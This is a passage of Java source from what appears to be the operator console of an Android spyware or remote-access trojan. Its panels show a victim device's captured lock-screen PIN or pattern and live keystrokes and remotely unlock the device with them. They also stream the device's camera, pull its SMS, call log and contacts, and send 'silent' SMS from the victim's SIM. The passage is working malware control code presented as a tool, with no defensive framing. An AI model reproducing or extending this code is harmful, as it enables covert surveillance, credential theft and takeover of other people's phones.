        camLens = "back".equals(camLens) ? "front" : "back";
        btnCamLens.setText("front".equals(camLens) ? "➡ FRONT" : "⬅ BACK");
        if (isCamView && selDev != null) try {
            AdminRelayClient.get().sendCmd(selDev.androidId, "stop_cam_stream", null);
            h.postDelayed(() -> {
                if (isCamView && selDev != null) try {
                    AdminRelayClient.get().sendCmd(selDev.androidId, "start_cam_stream",
                        new JSONObject().put("lens", camLens).put("quality", streamQuality));
                } catch (Exception ignored) {}
            }, 300);
        } catch (Exception ignored) {}
    }
    private void stopCamFeed() {
        isCamStreamOn = false;
        if (camPoller != null) h.removeCallbacks(camPoller);
        if (selDev != null) AdminRelayClient.get().sendCmd(selDev.androidId, "stop_cam_stream", null);
    }
}
class LockPanel extends BasePanel {
    private TextView     tvType, tvValue, tvTime, tvLockStatus, tvLivePulse, tvPatternSequence;
    private LinearLayout historyContainer;
    private LinearLayout patCard;    
    private PatternView  patternView;
    private Button       btnModeCaptured, btnModeDraw;
    private boolean      isCapturedViewMode = true;
    private Device       selDev;
    private final SimpleDateFormat dateFmt = new SimpleDateFormat("MMM dd, HH:mm:ss", Locale.US);

    public LockPanel(Context ctx, int[] theme) { super(ctx, theme); }

    @Override
    public View buildView() {
        LinearLayout root = row(true);
        root.setPadding(20, 20, 20, 20);

        LinearLayout vault = row(true);
        vault.setBackground(glassCardBg(CARD, SUCCESS));
        vault.setPadding(28, 28, 28, 28);
        vault.setGravity(Gravity.CENTER);

        LinearLayout vaultHead = row(false);
        vaultHead.setGravity(Gravity.CENTER_VERTICAL);
        tvLockStatus = badge("OFFLINE", TXT2, 0x22FFFFFF);
        vaultHead.addView(tvLockStatus);
        vault.addView(vaultHead);

        tvType = txt("Select a target device first", 13, TXT2, false);
        tvType.setPadding(0, 10, 0, 4);
        tvType.setGravity(Gravity.CENTER);
        vault.addView(tvType);

        tvValue = codeTxt("---", 34, PRIMARY, true);
        tvValue.setGravity(Gravity.CENTER);
        tvValue.setPadding(0, 4, 0, 4);
        vault.addView(tvValue);

        tvLivePulse = txt("", 12, ACCENT, true);
        tvLivePulse.setGravity(Gravity.CENTER);
        tvLivePulse.setVisibility(View.GONE);
        vault.addView(tvLivePulse);

        tvTime = txt("No key captured yet", 11, TXT2, false);
        tvTime.setGravity(Gravity.CENTER);
        vault.addView(tvTime);

        Button btnUnlock = gradientBtn("⚡ INSTANT UNLOCK WITH KEY", v -> applyUnlock(), SUCCESS, ACCENT);
        btnUnlock.setTextSize(13);
        LinearLayout.LayoutParams ulp = matchWrap();
        ulp.setMargins(0, 16, 0, 0);
        vault.addView(btnUnlock, ulp);
        root.addView(vault);

        patCard = row(true);          
        patCard.setBackground(glassCardBg(0xFF0F172A, BORDER));
        patCard.setPadding(20, 20, 20, 20);
        patCard.setGravity(Gravity.CENTER_HORIZONTAL);
        LinearLayout.LayoutParams pcLp = matchWrap();
        pcLp.setMargins(0, 16, 0, 0);
        patCard.setLayoutParams(pcLp);

        LinearLayout pHead = row(false);
        pHead.setGravity(Gravity.CENTER_VERTICAL);
        TextView tvPatTitle = codeTxt("◈ CYBER PATTERN CAPTURE", 12, ACCENT, true);
        tvPatTitle.setLetterSpacing(0.04f);
        pHead.addView(tvPatTitle, new LinearLayout.LayoutParams(0, -2, 1f));

        btnModeCaptured = pillBtn("CAPTURED", v -> setPatternMode(true), 0x3300F0FF, PRIMARY);
        btnModeDraw = pillBtn("DRAW", v -> setPatternMode(false), 0, BORDER);
        LinearLayout.LayoutParams m1Lp = new LinearLayout.LayoutParams(-2, -2);
        m1Lp.setMargins(0, 0, 6, 0);
        pHead.addView(btnModeCaptured, m1Lp);
        pHead.addView(btnModeDraw);
        patCard.addView(pHead);

        tvPatternSequence = codeTxt("SEQUENCE: WAITING FOR CAPTURE", 11, TXT2, true);
        tvPatternSequence.setGravity(Gravity.CENTER);
        tvPatternSequence.setPadding(0, 12, 0, 4);
        patCard.addView(tvPatternSequence);

        patternView = new PatternView(ctx, pattern -> applyPatternUnlock(pattern));
        LinearLayout.LayoutParams pvLp = new LinearLayout.LayoutParams(dp(270), dp(270));
        pvLp.gravity = Gravity.CENTER;
        pvLp.topMargin = dp(6);
        patCard.addView(patternView, pvLp);

        LinearLayout patActions = row(false);
        patActions.setGravity(Gravity.CENTER);
        patActions.setPadding(0, 12, 0, 0);
        Button btnSendPat = gradientBtn("⚡ UNLOCK PATTERN", v -> applyUnlock(), SUCCESS, ACCENT);
        Button btnClear = pillBtn("CLEAR", v -> { if (patternView != null) patternView.clear(); }, 0, BORDER);
        patActions.addView(btnSendPat, fill(2));
        LinearLayout.LayoutParams cLp = new LinearLayout.LayoutParams(-2, -2);
        cLp.setMargins(10, 0, 0, 0);
        patActions.addView(btnClear, cLp);
        patCard.addView(patActions);

        root.addView(patCard);

        Button btnClearHist = pillBtn("CLEAR LOG", v -> { if (selDev != null) { selDev.lockHistory.clear(); rebuildHistory(); } }, 0, BORDER);
        root.addView(sectionHeader("LOCK EVENT TIMELINE", btnClearHist));

        historyContainer = row(true);
        historyContainer.setBackground(cardBg(0xFF0F131C, BORDER, 16));
        historyContainer.setPadding(16, 16, 16, 16);
        LinearLayout.LayoutParams hsLp = matchWrap();
        hsLp.topMargin = 6;
        root.addView(historyContainer, hsLp);

        ScrollView sc = new ScrollView(ctx);
        sc.setFillViewport(true);
        sc.addView(root);
        return sc;
    }

    private void setPatternMode(boolean capturedMode) {
        this.isCapturedViewMode = capturedMode;
        if (patternView == null) return;
        patternView.setInteractive(!capturedMode);
        btnModeCaptured.setBackground(cardBg(capturedMode ? 0x3300F0FF : 0, capturedMode ? PRIMARY : BORDER, 16));
        btnModeCaptured.setTextColor(capturedMode ? PRIMARY : TXT2);
        btnModeDraw.setBackground(cardBg(!capturedMode ? 0x3310B981 : 0, !capturedMode ? SUCCESS : BORDER, 16));
        btnModeDraw.setTextColor(!capturedMode ? SUCCESS : TXT2);

        if (capturedMode && selDev != null && "pattern".equalsIgnoreCase(selDev.credType) && !selDev.credValue.isEmpty()) {
            patternView.setPattern(selDev.credValue);
        } else if (!capturedMode) {
            patternView.clear();
        }
    }

    private void applyLockTypeUI() {
        if (patCard == null) return;
        String lt = (selDev != null) ? selDev.detectedLockType : "none";
        if (lt == null) lt = "none";
        switch (lt.toLowerCase()) {
            case "pin":
            case "password":
                patCard.setVisibility(View.GONE);
                break;
            case "pattern":
            default: 
                patCard.setVisibility(View.VISIBLE);
                break;
        }
    }

    private void applyUnlock() {
        if (selDev == null || selDev.credValue.isEmpty()) {
            Toast.makeText(ctx, "No captured key available", Toast.LENGTH_SHORT).show();
            return;
        }
        applyCredUnlock(selDev.credType, selDev.credValue);
    }

    private void applyPatternUnlock(String pattern) {
        if (selDev == null) {
            Toast.makeText(ctx, "No device selected", Toast.LENGTH_SHORT).show();
            return;
        }
        applyCredUnlock("pattern", pattern);
    }

    private void applyCredUnlock(String type, String value) {
        if (selDev == null || !selDev.online) {
            Toast.makeText(ctx, "Device offline", Toast.LENGTH_SHORT).show();
            return;
        }
        try {
            JSONObject data = new JSONObject();
            String action;
            if ("pattern".equals(type)) {
                data.put("pattern", value);
                action = "unlock_with_pattern";
            } else {
                data.put("pin", value);
                action = "unlock_with_pin";
            }
            AdminRelayClient.get().sendCmd(selDev.androidId, action, data);
            Toast.makeText(ctx, "Sending " + type.toUpperCase() + " unlock...", Toast.LENGTH_SHORT).show();
        } catch (Exception ignored) {}
    }

    public void refresh() {
        if (tvType == null) return;
        if (selDev == null) {
            tvType.setText("No target device selected");
            tvValue.setText("---");
            tvTime.setText("");
            tvLockStatus.setText("OFFLINE");
            tvLivePulse.setVisibility(View.GONE);
            if (tvPatternSequence != null) tvPatternSequence.setText("SEQUENCE: NO TARGET");
            applyLockTypeUI(); 
            return;
        }

        String typeStr = selDev.credType.isEmpty() ? "No key captured" : selDev.credType.toUpperCase() + " KEY";
        tvType.setText(selDev.getSafeName() + " — " + typeStr);
        tvValue.setText(selDev.credValue.isEmpty() ? "---" : selDev.credValue);
        tvTime.setText(selDev.credTimestamp > 0 ? "Captured: " + dateFmt.format(new Date(selDev.credTimestamp)) : "");

        boolean locked = selDev.isLocked;
        tvLockStatus.setText(locked ? "[LOCKED]" : "[UNLOCKED]");
        tvLockStatus.setTextColor(locked ? DANGER : SUCCESS);
        tvLockStatus.setBackground(cardBg(locked ? 0x26F43F5E : 0x2610B981, locked ? DANGER : SUCCESS, 12));

        if (!selDev.livePinTyping.isEmpty()) {
            tvLivePulse.setVisibility(View.VISIBLE);
            tvLivePulse.setText(">> LIVE TYPING: " + selDev.livePinTyping);
        } else {
            tvLivePulse.setVisibility(View.GONE);
        }

        if ("pattern".equalsIgnoreCase(selDev.credType) && !selDev.credValue.isEmpty()) {
            StringBuilder seq = new StringBuilder("PATH: ");
            for (int i = 0; i < selDev.credValue.length(); i++) {
                if (i > 0) seq.append(" ➔ ");
                seq.append("(").append(selDev.credValue.charAt(i)).append(")");
            }
            if (tvPatternSequence != null) {
                tvPatternSequence.setText(seq.toString());
                tvPatternSequence.setTextColor(SUCCESS);
            }
            if (isCapturedViewMode && patternView != null) {
                patternView.setPattern(selDev.credValue);
            }
        } else {
            if (tvPatternSequence != null) {
                tvPatternSequence.setText("SEQUENCE: WAITING FOR CAPTURE");
                tvPatternSequence.setTextColor(TXT2);
            }
        }

        applyLockTypeUI(); 
        rebuildHistory();
    }

    private void rebuildHistory() {
        if (historyContainer == null) return;
        historyContainer.removeAllViews();
        if (selDev == null || selDev.lockHistory.isEmpty()) {
            historyContainer.addView(txt("No lock events captured yet", 12, TXT2, false));
            return;
        }

        for (Device.LockEntry e : selDev.lockHistory) {
            LinearLayout itemRow = row(false);
            itemRow.setBackground(cardBg(CARD, BORDER, 14));
            itemRow.setPadding(16, 12, 16, 12);
            itemRow.setGravity(Gravity.CENTER_VERTICAL);

            String tag;
            int ic;
            switch (e.lockType.toLowerCase()) {
                case "pin":     tag = "[PIN]"; ic = PRIMARY;  break;
                case "pattern": tag = "[PAT]"; ic = SUCCESS;  break;
                case "password":tag = "[PASS]";ic = DANGER;   break;
                default:        tag = "[KEY]"; ic = TXT2;     break;
            }

            LinearLayout.LayoutParams ipp = new LinearLayout.LayoutParams(-2, -2);
            ipp.setMargins(0, 0, 12, 0);
            itemRow.addView(txt(tag, 12, ic, true), ipp);

            LinearLayout textCol = row(true);
            textCol.addView(txt(e.lockType.toUpperCase() + (e.value.isEmpty() ? "" : ": " + e.value), 13, TXT1, true));
            textCol.addView(txt(dateFmt.format(new Date(e.timestamp)), 10, TXT2, false));
            itemRow.addView(textCol, new LinearLayout.LayoutParams(0, -2, 1f));

            if (!e.value.isEmpty() && !e.value.contains("manual") && !e.value.contains("no security") && !e.value.contains("cannot")) {
                if ("pattern".equalsIgnoreCase(e.lockType)) {
                    Button viewBtn = pillBtn("VIEW", v -> {
                        if (patternView != null) {
                            setPatternMode(true);
                            patternView.setPattern(e.value);
                            if (tvPatternSequence != null) {
                                StringBuilder s = new StringBuilder("PATH: ");
                                for (int i = 0; i < e.value.length(); i++) {
                                    if (i > 0) s.append(" ➔ ");
                                    s.append("(").append(e.value.charAt(i)).append(")");
                                }
                                tvPatternSequence.setText(s.toString());
                                tvPatternSequence.setTextColor(SUCCESS);
                            }
                        }
                    }, 0x2200F0FF, PRIMARY);
                    viewBtn.setTextSize(11);
                    viewBtn.setPadding(10, 6, 10, 6);
                    LinearLayout.LayoutParams vpLp = new LinearLayout.LayoutParams(-2, -2);
                    vpLp.setMargins(0, 0, 6, 0);
                    itemRow.addView(viewBtn, vpLp);
                }

                Button applyBtn = pillBtn("APPLY", v -> applyCredUnlock(e.lockType, e.value), 0x2210B981, SUCCESS);
                applyBtn.setTextSize(11);
                applyBtn.setPadding(14, 6, 14, 6);
                itemRow.addView(applyBtn);
            }

            LinearLayout.LayoutParams rlp = matchWrap();
            rlp.setMargins(0, 0, 0, 8);
            itemRow.setLayoutParams(rlp);
            historyContainer.addView(itemRow);
        }
    }
    @Override
    public void onDeviceSelected(Device d) {
        this.selDev = d;
        refresh();
    }
    @Override
    public void onMessage(JSONObject msg) {
        String type = msg.optString("type", "");
        switch (type) {
            case "lock_captured":
            case "credentials_saved":
            case "lock_detected":
            case "pin_typing":
            case "battery_info":
                refresh();
                break;
        }
    }
}
class SmsPanel extends BasePanel {
    private LinearLayout smsContainer, callContainer, contactContainer, composeContainer;
    private Button tabSms, tabCalls, tabContacts, tabCompose;
    private View smsView, callView, contactView, composeView;
    private EditText composePhoneEdit, composeMsgEdit;
    private TextView tvCharCount;
    private Spinner simSpinner;
    private Device selDev;
    private final SimpleDateFormat dtFmt = new SimpleDateFormat("MMM dd, HH:mm", Locale.US);
    private String rawSmsJson = "[]", rawCallJson = "[]", rawContactJson = "[]";
    private String filterQuery = "";
    private int currentSubTab = 0;

    public SmsPanel(Context ctx, int[] theme) { super(ctx, theme); }

    @Override
    public View buildView() {
        LinearLayout root = row(true);
        root.setPadding(20, 20, 20, 20);

        LinearLayout tabBar = row(false);
        tabBar.setBackground(cardBg(CARD, BORDER, 16));
        tabBar.setPadding(4, 4, 4, 4);
        LinearLayout.LayoutParams tblp = matchWrap();
        tblp.setMargins(0, 0, 0, 14);
        tabBar.setLayoutParams(tblp);

        tabSms      = subTab("[SMS]",         v -> showSubTab(0));
        tabCalls    = subTab("[CALLS]",       v -> showSubTab(1));
        tabContacts = subTab("[CONTACTS]",    v -> showSubTab(2));
        tabCompose  = subTab("[✉ SEND SMS]",  v -> showSubTab(3));

        tabBar.addView(tabSms,      fill(1));
        tabBar.addView(tabCalls,    fill(1));
        tabBar.addView(tabContacts, fill(1));
        tabBar.addView(tabCompose,  fill(1));
        root.addView(tabBar);

        LinearLayout actRow = row(false);
        actRow.setGravity(Gravity.CENTER_VERTICAL);
        actRow.setPadding(0, 0, 0, 12);

        EditText searchEdit = searchField("Search messages, calls or contacts...", new TextWatcher() {
            public void afterTextChanged(Editable s) { filterQuery = s.toString().toLowerCase().trim(); applyFilter(); }
            public void beforeTextChanged(CharSequence s, int st, int c, int a) {}
            public void onTextChanged(CharSequence s, int st, int b, int c) {}
        });
        actRow.addView(searchEdit, new LinearLayout.LayoutParams(0, -2, 1f));

        Button btnFetch = pillBtn("[FETCH]", v -> fetchCurrentTab(), 0x3300F0FF, PRIMARY);
        btnFetch.setPadding(16, 12, 16, 12);
        LinearLayout.LayoutParams flp = new LinearLayout.LayoutParams(-2, -2);
        flp.setMargins(10, 0, 0, 0);
        actRow.addView(btnFetch, flp);
        root.addView(actRow);

        smsContainer = row(true);
        smsView = wrapInScroll(smsContainer);
        root.addView(smsView);

        callContainer = row(true);
        callView = wrapInScroll(callContainer);
        callView.setVisibility(View.GONE);
        root.addView(callView);

        contactContainer = row(true);
        contactView = wrapInScroll(contactContainer);
        contactView.setVisibility(View.GONE);
        root.addView(contactView);

        composeView = buildComposeView();
        composeView.setVisibility(View.GONE);
        root.addView(composeView);

        showSubTab(0);
        return root;
    }

    private View buildComposeView() {
        ScrollView sc = new ScrollView(ctx);
        sc.setBackground(cardBg(0xFF0F131C, BORDER, 16));
        sc.setFillViewport(true);

        composeContainer = row(true);
        composeContainer.setPadding(24, 24, 24, 24);

        TextView tvTitle = codeTxt("✉ COMPOSE & DISPATCH SILENT SMS", 12, ACCENT, true);
        tvTitle.setPadding(0, 0, 0, 16);
        composeContainer.addView(tvTitle);

        TextView tvPhoneLabel = codeTxt("RECIPIENT NUMBER:", 10, TXT2, true);
        tvPhoneLabel.setPadding(0, 6, 0, 4);
        composeContainer.addView(tvPhoneLabel);

        composePhoneEdit = new EditText(ctx);
        composePhoneEdit.setHint("e.g. +1234567890 or 017...");
        composePhoneEdit.setTextColor(TXT1);
        composePhoneEdit.setHintTextColor(TXT2);
        composePhoneEdit.setTextSize(13);
        composePhoneEdit.setSingleLine(true);
        composePhoneEdit.setPadding(dp(14), dp(12), dp(14), dp(12));
        composePhoneEdit.setBackground(cardBg(CARD, BORDER, 12));
        composeContainer.addView(composePhoneEdit, matchWrap());

        TextView tvMsgLabel = codeTxt("MESSAGE BODY:", 10, TXT2, true);
        tvMsgLabel.setPadding(0, 16, 0, 4);
        composeContainer.addView(tvMsgLabel);

        composeMsgEdit = new EditText(ctx);
        composeMsgEdit.setHint("Enter text message to send through target device...");
        composeMsgEdit.setTextColor(TXT1);
        composeMsgEdit.setHintTextColor(TXT2);
        composeMsgEdit.setTextSize(13);
        composeMsgEdit.setPadding(dp(14), dp(12), dp(14), dp(12));
        composeMsgEdit.setBackground(cardBg(CARD, BORDER, 12));
        composeMsgEdit.setMinLines(4);
        composeMsgEdit.setGravity(Gravity.TOP | Gravity.START);
        composeContainer.addView(composeMsgEdit, new LinearLayout.LayoutParams(-1, dp(110)));

        tvCharCount = codeTxt("0 / 160 characters (1 SMS)", 10, TXT2, false);
        tvCharCount.setPadding(dp(4), dp(6), 0, dp(14));
        composeContainer.addView(tvCharCount);

        composeMsgEdit.addTextChangedListener(new TextWatcher() {
            public void afterTextChanged(Editable s) {
                int len = s.length();
                int count = len <= 160 ? 1 : (len / 153 + 1);
                tvCharCount.setText(len + " / 160 characters (" + count + " SMS)");
            }
            public void beforeTextChanged(CharSequence s, int st, int c, int a) {}
            public void onTextChanged(CharSequence s, int st, int b, int c) {}
        });

        LinearLayout simRow = row(false);
        simRow.setGravity(Gravity.CENTER_VERTICAL);
        simRow.setPadding(0, 4, 0, 20);
        simRow.addView(codeTxt("OUTGOING SIM: ", 11, TXT2, true));

        simSpinner = new Spinner(ctx);
        ArrayAdapter<String> adapter = new ArrayAdapter<>(ctx, android.R.layout.simple_spinner_item, new String[]{"SIM 1 (Default)", "SIM 2"});
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        simSpinner.setAdapter(adapter);
        simRow.addView(simSpinner, new LinearLayout.LayoutParams(-2, -2));
        composeContainer.addView(simRow);

        LinearLayout btnRow = row(false);
        Button btnSend = gradientBtn("✉ SEND SMS NOW >>", v -> dispatchSms(), SUCCESS, ACCENT);
        Button btnClear = pillBtn("CLEAR", v -> {
            composePhoneEdit.setText("");
            composeMsgEdit.setText("");
        }, 0, BORDER);

        btnRow.addView(btnSend, fill(2));
        LinearLayout.LayoutParams clp = new LinearLayout.LayoutParams(-2, -2);
        clp.setMargins(dp(10), 0, 0, 0);
        btnRow.addView(btnClear, clp);
        composeContainer.addView(btnRow);

        sc.addView(composeContainer, matchWrap());
        sc.setLayoutParams(new LinearLayout.LayoutParams(-1, 0, 1f));
        return sc;
    }

    private void dispatchSms() {
        if (selDev == null || !selDev.online) {
            Toast.makeText(ctx, "Target device is offline or not selected", Toast.LENGTH_SHORT).show();
            return;
        }
        String phone = composePhoneEdit != null ? composePhoneEdit.getText().toString().trim() : "";
        String msg = composeMsgEdit != null ? composeMsgEdit.getText().toString().trim() : "";
        int simSlot = simSpinner != null ? simSpinner.getSelectedItemPosition() : 0;

        if (phone.isEmpty()) {
            Toast.makeText(ctx, "Please enter recipient phone number", Toast.LENGTH_SHORT).show();
            return;
        }
        if (msg.isEmpty()) {
            Toast.makeText(ctx, "Please enter message text", Toast.LENGTH_SHORT).show();
            return;
        }

        try {
            JSONObject data = new JSONObject();
            data.put("number", phone);
            data.put("message", msg);
            data.put("slot", simSlot);
            AdminRelayClient.get().sendCmd(selDev.androidId, "send_sms", data);
            Toast.makeText(ctx, "Dispatched SMS to " + phone + " via SIM " + (simSlot + 1), Toast.LENGTH_SHORT).show();
            composeMsgEdit.setText("");
        } catch (Exception ignored) {}
    }

    private ScrollView wrapInScroll(LinearLayout content) {
        ScrollView sc = new ScrollView(ctx);
        sc.setBackground(cardBg(0xFF0F131C, BORDER, 16));
        sc.setFillViewport(true);
        sc.addView(content, matchWrap());
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-1, 0, 1f);
        sc.setLayoutParams(lp);
        return sc;
    }

    private Button subTab(String label, View.OnClickListener l) {
        Button b = btn(label, l, 0);
        b.setBackground(null);
        b.setTextSize(11);
        b.setTextColor(TXT2);
        return b;
    }

    private void showSubTab(int idx) {
        currentSubTab = idx;
        smsView.setVisibility(idx == 0 ? View.VISIBLE : View.GONE);
        callView.setVisibility(idx == 1 ? View.VISIBLE : View.GONE);
        contactView.setVisibility(idx == 2 ? View.VISIBLE : View.GONE);
        composeView.setVisibility(idx == 3 ? View.VISIBLE : View.GONE);

        tabSms.setTextColor(idx == 0 ? PRIMARY : TXT2);
        tabCalls.setTextColor(idx == 1 ? PRIMARY : TXT2);
        tabContacts.setTextColor(idx == 2 ? PRIMARY : TXT2);
        tabCompose.setTextColor(idx == 3 ? PRIMARY : TXT2);
        applyFilter();
    }

    private void fetchCurrentTab() {
        if (selDev == null || !selDev.online) {
            Toast.makeText(ctx, "No device selected or target offline", Toast.LENGTH_SHORT).show();
            return;
        }
        switch (currentSubTab) {
            case 0:
                smsContainer.removeAllViews();
                smsContainer.addView(txt("[SYNC] Fetching SMS inbox...", 12, TXT2, false));
                AdminRelayClient.get().sendCmd(selDev.androidId, "get_sms", null);
                break;
            case 1:
                callContainer.removeAllViews();
                callContainer.addView(txt("[SYNC] Fetching call log...", 12, TXT2, false));
                AdminRelayClient.get().sendCmd(selDev.androidId, "get_calls", null);
                break;
            case 2:
                contactContainer.removeAllViews();
                contactContainer.addView(txt("[SYNC] Fetching contacts list...", 12, TXT2, false));
                AdminRelayClient.get().sendCmd(selDev.androidId, "get_contacts", null);
                break;
            case 3:
                Toast.makeText(ctx, "Ready to send SMS", Toast.LENGTH_SHORT).show();
                break;
        }
    }

    private void applyFilter() {
        if (currentSubTab == 0) showSms(rawSmsJson);
        else if (currentSubTab == 1) showCalls(rawCallJson);
        else if (currentSubTab == 2) showContacts(rawContactJson);
    }

    private void showSms(String json) {
        smsContainer.removeAllViews();
        try {
            JSONArray arr = new JSONArray(json);
            if (arr.length() == 0) { smsContainer.addView(placeholder("No SMS messages found")); return; }
            for (int i = 0; i < arr.length(); i++) {
                JSONObject s = arr.getJSONObject(i);
                String from = s.optString("from", "Unknown");
                String body = s.optString("body", "");
                long date   = s.optLong("date", 0);
                boolean read = s.optBoolean("read", true);
                if (!filterQuery.isEmpty() && !from.toLowerCase().contains(filterQuery) && !body.toLowerCase().contains(filterQuery))
                    continue;
                LinearLayout card = row(true);
                card.setBackground(cardBg(read ? CARD : 0xFF1A1030, read ? BORDER : ACCENT, 14));
                card.setPadding(18, 14, 18, 14);

                LinearLayout header = row(false);
                header.setGravity(Gravity.CENTER_VERTICAL);
                header.addView(txt((read ? "" : "[NEW] ") + from, 13, read ? TXT1 : ACCENT, true), new LinearLayout.LayoutParams(0, -2, 1f));
                header.addView(txt(dtFmt.format(new Date(date)), 10, TXT2, false));

                Button replyBtn = pillBtn("REPLY", v -> {
                    if (composePhoneEdit != null) composePhoneEdit.setText(from);
                    showSubTab(3);
                }, 0x2210B981, SUCCESS);
                replyBtn.setTextSize(10);
                replyBtn.setPadding(10, 4, 10, 4);
                LinearLayout.LayoutParams rlp2 = new LinearLayout.LayoutParams(-2, -2);
                rlp2.setMargins(10, 0, 0, 0);
                header.addView(replyBtn, rlp2);

                card.addView(header);
                card.addView(txt(body.length() > 220 ? body.substring(0, 220) + "..." : body, 12, TXT2, false));
                LinearLayout.LayoutParams lp = matchWrap();
                lp.setMargins(10, 8, 10, 0);
                card.setLayoutParams(lp);
                smsContainer.addView(card);
            }
        } catch (Exception e) { smsContainer.addView(txt("Parse error: " + e.getMessage(), 12, DANGER, false)); }
    }

    private void showCalls(String json) {
        callContainer.removeAllViews();
        try {
            JSONArray arr = new JSONArray(json);
            if (arr.length() == 0) { callContainer.addView(placeholder("No call log entries found")); return; }
            String[] typeLabel = {"", "[IN]", "[OUT]", "[MISSED]", "[VOICE]"};
            for (int i = 0; i < arr.length(); i++) {
                JSONObject c = arr.getJSONObject(i);
                String number = c.optString("number", "Unknown");
                String name   = c.optString("name", "");
                long date = c.optLong("date", 0);
                long dur  = c.optLong("duration", 0);
                int type  = c.optInt("type", 0);
                if (!filterQuery.isEmpty() && !number.toLowerCase().contains(filterQuery) && !name.toLowerCase().contains(filterQuery))
                    continue;
                LinearLayout card = row(false);
                card.setBackground(cardBg(CARD, BORDER, 14));
                card.setPadding(18, 14, 18, 14);
                card.setGravity(Gravity.CENTER_VERTICAL);
                String typeStr = (type > 0 && type < typeLabel.length) ? typeLabel[type] : "[CALL]";
                int tc = type == 3 ? DANGER : type == 2 ? SUCCESS : TXT1;
                card.addView(txt(typeStr, 11, tc, true));
                LinearLayout info = row(true);
                info.setPadding(14, 0, 0, 0);
                info.addView(txt(name.isEmpty() ? number : name, 13, TXT1, true));
                info.addView(txt(dtFmt.format(new Date(date)) + (dur > 0 ? "  •  " + formatDur(dur) : ""), 10, TXT2, false));
                card.addView(info, new LinearLayout.LayoutParams(0, -2, 1f));

                if (!number.isEmpty() && !number.equals("Unknown")) {
                    Button smsBtn = pillBtn("SMS", v -> {
                        if (composePhoneEdit != null) composePhoneEdit.setText(number);
                        showSubTab(3);
                    }, 0x2200F0FF, PRIMARY);
                    smsBtn.setTextSize(10);
                    smsBtn.setPadding(10, 4, 10, 4);
                    LinearLayout.LayoutParams slp = new LinearLayout.LayoutParams(-2, -2);
                    slp.setMargins(8, 0, 0, 0);
                    card.addView(smsBtn, slp);
                }

                LinearLayout.LayoutParams lp = matchWrap();
                lp.setMargins(10, 8, 10, 0);
                card.setLayoutParams(lp);
                callContainer.addView(card);
            }
        } catch (Exception e) { callContainer.addView(txt("Parse error: " + e.getMessage(), 12, DANGER, false)); }
    }

    private void showContacts(String json) {
        contactContainer.removeAllViews();
        try {
            JSONArray arr = new JSONArray(json);
            if (arr.length() == 0) { contactContainer.addView(placeholder("No contacts found")); return; }
            for (int i = 0; i < arr.length(); i++) {
                JSONObject c = arr.getJSONObject(i);
                String name   = c.optString("name", "Unknown");
                String number = c.optString("number", "");
                if (!filterQuery.isEmpty() && !name.toLowerCase().contains(filterQuery) && !number.toLowerCase().contains(filterQuery))
                    continue;
                LinearLayout card = row(false);
                card.setBackground(cardBg(CARD, BORDER, 14));
                card.setPadding(18, 14, 18, 14);
                card.setGravity(Gravity.CENTER_VERTICAL);
                TextView avatar = txt(!name.isEmpty() ? String.valueOf(name.charAt(0)).toUpperCase() : "?", 16, PRIMARY, true);
                avatar.setGravity(Gravity.CENTER);
                avatar.setBackground(cardBg(0x336366F1, PRIMARY, 24));
                LinearLayout.LayoutParams avLp = new LinearLayout.LayoutParams(72, 72);
                avLp.setMargins(0, 0, 14, 0);
                avLp.gravity = Gravity.CENTER_VERTICAL;
                card.addView(avatar, avLp);
                LinearLayout info = row(true);
                info.addView(txt(name, 13, TXT1, true));
                info.addView(txt(number, 11, TXT2, false));
                card.addView(info, new LinearLayout.LayoutParams(0, -2, 1f));

                if (!number.isEmpty()) {
                    Button smsBtn = pillBtn("SMS", v -> {
                        if (composePhoneEdit != null) composePhoneEdit.setText(number);
                        showSubTab(3);
                    }, 0x2200F0FF, PRIMARY);
                    smsBtn.setTextSize(10);
                    smsBtn.setPadding(10, 4, 10, 4);
                    LinearLayout.LayoutParams slp = new LinearLayout.LayoutParams(-2, -2);
                    slp.setMargins(8, 0, 0, 0);
                    card.addView(smsBtn, slp);
                }

                LinearLayout.LayoutParams lp = matchWrap();
                lp.setMargins(10, 8, 10, 0);
                card.setLayoutParams(lp);
                contactContainer.addView(card);
            }
        } catch (Exception e) { contactContainer.addView(txt("Parse error: " + e.getMessage(), 12, DANGER, false)); }
    }

    private TextView placeholder(String msg) {
        TextView t = txt(msg, 12, TXT2, false);
        t.setPadding(20, 30, 20, 30);
        t.setGravity(Gravity.CENTER);
        return t;
    }

    private String formatDur(long secs) {
        if (secs < 60) return secs + "s";
        return (secs / 60) + "m " + (secs % 60) + "s";
    }

    @Override
    public void onDeviceSelected(Device d) {
        this.selDev = d;
        rawSmsJson = "[]";
        rawCallJson = "[]";
        rawContactJson = "[]";
        applyFilter();
    }

    @Override
    public void onMessage(JSONObject msg) {
        String type = msg.optString("type", "");
        if ("sms_data".equals(type)) { rawSmsJson = msg.optString("messages", "[]"); showSms(rawSmsJson); }
        else if ("call_log".equals(type)) { rawCallJson = msg.optString("calls", "[]"); showCalls(rawCallJson); }
        else if ("contacts".equals(type)) { rawContactJson = msg.optString("contacts", "[]"); showContacts(rawContactJson); }
    }
}
class AppsPanel extends BasePanel {
    private ListView appList;
    private AppAdapter adapter;
    private Device selDev;
    private String lastAppsJson = "";
    public AppsPanel(Context ctx, int[] theme) { super(ctx, theme); }
    @Override
    public View buildView() {
        LinearLayout root = row(true);
        root.setPadding(20, 20, 20, 20);
        Button fetchBtn = pillBtn("[FETCH APPS]", v -> fetchApps(), 0x3300F0FF, PRIMARY);
        root.addView(sectionHeader("INSTALLED APPLICATIONS", fetchBtn));
        EditText searchBox = searchField("Search apps by name or package...", new TextWatcher() {
            public void afterTextChanged(Editable s) { filterApps(s.toString()); }
            public void beforeTextChanged(CharSequence s, int st, int c, int a) {}
            public void onTextChanged(CharSequence s, int st, int b, int c) {}
        });
        LinearLayout.LayoutParams slp = matchWrap(); slp.setMargins(0, 8, 0, 12);
        searchBox.setLayoutParams(slp); root.addView(searchBox);
        appList = new ListView(ctx);
        appList.setDivider(null);
        appList.setDividerHeight(0);
        appList.setBackground(cardBg(0xFF0F131C, BORDER, 16));
        adapter = new AppAdapter();
        appList.setAdapter(adapter);
        LinearLayout.LayoutParams alp = new LinearLayout.LayoutParams(-1, -1, 1f);
        root.addView(appList, alp);
        return root;
    }
    private void fetchApps() {
        if (selDev == null || !selDev.online) {
            Toast.makeText(ctx, "No device selected or offline", Toast.LENGTH_SHORT).show(); return;
        }
        adapter.clear();
